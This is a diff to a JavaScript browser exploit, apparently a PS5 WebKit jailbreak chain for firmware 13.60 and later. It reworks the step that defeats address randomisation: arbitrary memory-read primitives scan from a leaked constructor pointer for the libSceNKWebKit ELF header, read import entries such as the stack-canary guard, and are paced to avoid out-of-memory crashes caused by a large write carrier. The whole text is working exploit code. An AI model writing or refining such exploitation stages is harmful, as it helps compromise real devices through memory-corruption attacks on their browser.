@@ -120,58 +120,82 @@ function i64Num(num) {
     return new int64(num % 0x100000000, Math.floor(num / 0x100000000));
 }
 
-// 13.60+ calibration: the per-fw host-constructor RVA table (hc) no longer
-// satisfies the stock page-alignment check, so locate the REAL libSceNKWebKit
-// base by scanning down from the leaked ctor for the ELF signature.
-// ELF header sits at base-0x4000 when PS5 maps "file offset = rva + 0x4000".
-function scanForWkBase(p, ctor) {
+// 13.60+ calibration (v3, anarquiaTAB fork): the 12.00 host-ctor RVA 0x2A58 is
+// verified valid on 13.60 (ctor % 0x4000 == 0x2A58 in every sampled run), so the
+// primary path derives webkitBase = ctor - hc directly and confirms it with an
+// ELF-magic read in prepare(). The old 16MB synchronous scan (1024 steps x 2
+// reads) OOM-killed the page on 13.60 because the JSC heap is already near its
+// cap from the 72MB write carrier; it survives only as this paced, scratch-
+// based fallback that never allocates in the hot loop, yields for GC/beacon
+// flushing, stops at the FIRST hit and RETURNS the base to the caller.
+async function scanForWkBase(p, ctor) {
     jbmark("SCAN-WK-START", "ctor=0x" + ctor.toString(16)
-        + "-window=0x1000000-step=0x4000");
+        + "-narrow=0x50000-wide=0x400000-step=0x4000");
     const MAGIC = 0x464C457F; // "\x7fELF" little-endian u32
-    const WINDOW = 0x1000000;
     const STEP = 0x4000;
+    const scratch = new int64(0, 0);
     let steps = 0;
     let hits = 0;
-    const startBase = Math.floor((ctor - WINDOW) / STEP) * STEP;
-    for (let B = startBase; B < ctor; B += STEP) {
-        if (B < 0x800000000) break;
-        steps++;
-        let magicHere = -1;
-        let v = null;
-        if (B - STEP >= 0x800000000) {
-            try {
-                v = p.read8(i64Num(B - STEP));
-                if (v.low === MAGIC) magicHere = 0;
-            } catch (e) {}
-        }
-        if (magicHere < 0) {
-            try {
-                v = p.read8(i64Num(B));
-                if (v.low === MAGIC) magicHere = 1;
-            } catch (e) {}
-        }
-        if (magicHere < 0) continue;
-        const elf64 = (v.hi & 0xFF) === 2
-            && ((v.hi >> 8) & 0xFF) === 1
-            && ((v.hi >> 16) & 0xFF) === 1;
-        let gotMemset = "?";
-        let gotGuard = "?";
+    // Narrow window around the RVA-derivable guess first; widen only when needed.
+    const windows = [
+        { lo: ctor - 0x50000, hi: ctor },
+        { lo: ctor - 0x400000, hi: ctor }
+    ];
+    function magicAt(n) {
         try {
-            gotMemset = "0x" + p.read8(i64Num(B + OFFSET_wk_memset_import)).toString();
-        } catch (e) {}
-        try {
-            gotGuard = "0x" + p.read8(i64Num(B + OFFSET_wk___stack_chk_guard_import)).toString();
-        } catch (e) {}
-        hits++;
-        jbmark("SCAN-WK-HIT", "B=0x" + B.toString(16)
-            + "-hc=0x" + (ctor - B).toString(16)
-            + "-magic=" + (magicHere === 0 ? "atB-0x4000" : "atB")
-            + "-elf64=" + (elf64 ? 1 : 0)
-            + "-gotMemset=" + gotMemset
-            + "-gotGuard=" + gotGuard);
-        if (hits >= 4) break;
+            scratch.low = n & 0xFFFFFFFF;
+            scratch.hi = Math.floor(n / 0x100000000) & 0xFFFFFFFF;
+            const v = p.read8(scratch);
+            return v.low === MAGIC ? v : null;
+        } catch (e) { return null; }
     }
-    jbmark("SCAN-WK-DONE", "steps=" + steps + "-hits=" + hits);
+    for (let w = 0; w < windows.length; ++w) {
+        if (hits) break;
+        const lo = Math.floor(windows[w].lo / STEP) * STEP;
+        const hi = windows[w].hi;
+        for (let B = lo; B < hi && hits === 0; B += STEP) {
+            if (B < 0x800000000) break;
+            steps++;
+            let v = null;
+            let magicHere = -1;
+            if (B - STEP >= 0x800000000 && (v = magicAt(B - STEP)) !== null)
+                magicHere = 0;
+            if (magicHere < 0 && (v = magicAt(B)) !== null)
+                magicHere = 1;
+            if (magicHere < 0) {
+                if ((steps & 127) === 0)
+                    await new Promise(r => setTimeout(r, 1));
+                if ((steps & 255) === 0)
+                    jbmark("SCAN-WK-PROGRESS", "steps=" + steps
+                        + "-at=0x" + B.toString(16));
+                continue;
+            }
+            const elf64 = (v.hi & 0xFF) === 2
+                && ((v.hi >> 8) & 0xFF) === 1
+                && ((v.hi >> 16) & 0xFF) === 1;
+            let gotMemset = "?";
+            let gotGuard = "?";
+            try {
+                gotMemset = "0x" + p.read8(i64Num(B + OFFSET_wk_memset_import)).toString();
+            } catch (e) {}
+            try {
+                gotGuard = "0x" + p.read8(i64Num(B + OFFSET_wk___stack_chk_guard_import)).toString();
+            } catch (e) {}
+            hits++;
+            const base = new int64(B % 0x100000000, Math.floor(B / 0x100000000));
+            jbmark("SCAN-WK-HIT", "B=0x" + B.toString(16)
+                + "-hc=0x" + (ctor - B).toString(16)
+                + "-magic=" + (magicHere === 0 ? "atB-0x4000" : "atB")
+                + "-elf64=" + (elf64 ? 1 : 0)
+                + "-gotMemset=" + gotMemset
+                + "-gotGuard=" + gotGuard);
+            jbmark("SCAN-WK-DONE", "steps=" + steps + "-hits=" + hits);
+            return base;
+        }
+    }
+    jbmark("SCAN-WK-DONE", "steps=" + steps + "-hits=" + hits
+        + "-result=no-elf-magic");
+    return null;
 }
 
 async function prepare(p) {
@@ -194,20 +218,49 @@ async function prepare(p) {
         for (const hc of OFFSET_wk_host_constructor_candidates) {
             const wb = ctor - hc;
             if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
-                libSceNKWebKitBase = new int64(wb % 0x100000000, Math.floor(wb / 0x100000000));
-                jbmark("WEBKIT-BASE-HC", "hc=0x" + hc.toString(16)
-                    + "-base=0x" + wb.toString(16));
-                break;
+                // Direct derivation (v3): confirm the ELF header sits at wb, or at
+                // wb-0x4000 under the "file offset = rva + 0x4000" load bias, with
+                // two reads. NO scan on this path, so no OOM risk.
+                let magicHere = -1;
+                let m = null;
+                try {
+                    m = p.read8(i64Num(wb));
+                    if (m.low === 0x464C457F) magicHere = 0;
+                } catch (e) {}
+                if (magicHere < 0) {
+                    try {
+                        m = p.read8(i64Num(wb - 0x4000));
+                        if (m.low === 0x464C457F) magicHere = 1;
+                    } catch (e) {}
+                }
+                if (magicHere >= 0) {
+                    const elf64 = (m.hi & 0xFF) === 2
+                        && ((m.hi >> 8) & 0xFF) === 1
+                        && ((m.hi >> 16) & 0xFF) === 1;
+                    libSceNKWebKitBase = new int64(wb % 0x100000000, Math.floor(wb / 0x100000000));
+                    jbmark("WEBKIT-BASE-HC", "hc=0x" + hc.toString(16)
+                        + "-base=0x" + wb.toString(16)
+                        + "-magicAt=" + (magicHere === 0 ? "base" : "base-0x4000")
+                        + "-elf64=" + (elf64 ? 1 : 0));
+                    break;
+                }
+                jbmark("WEBKIT-BASE-HC-REJECT", "hc=0x" + hc.toString(16)
+                    + "-wb=0x" + wb.toString(16) + "-magic=miss");
             }
         }
         if (libSceNKWebKitBase === null) {
             try {
-                scanForWkBase(p, ctor);
+                const scanBase = await scanForWkBase(p, ctor);
+                if (scanBase !== null) {
+                    libSceNKWebKitBase = scanBase;
+                } else {
+                    throw new Error("no host-constructor candidate gave a valid base (ctor=0x"
+                        + ctor.toString(16) + ")");
+                }
             } catch (e) {
-                jbmark("SCAN-WK-ERR", "scan crashed: " + String(e));
+                jbmark("SCAN-WK-ERR", "scan failed: " + String(e));
+                throw e;
             }
-            throw new Error("no host-constructor candidate gave a valid base (ctor=0x"
-                + ctor.toString(16) + ")");
         }
     } else {
         jbmark("WEBKIT-BASE-VTABLE", "fw=" + window.fw_str
@@ -467,6 +520,7 @@ async function prepare(p) {
 let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
-fwScript.setAttribute('src', `../offsets/${window.fw_str}.js?v=final`);
+fwScript.setAttribute('src', `../offsets/${window.fw_str}.js?v=final3`);
+
 
 
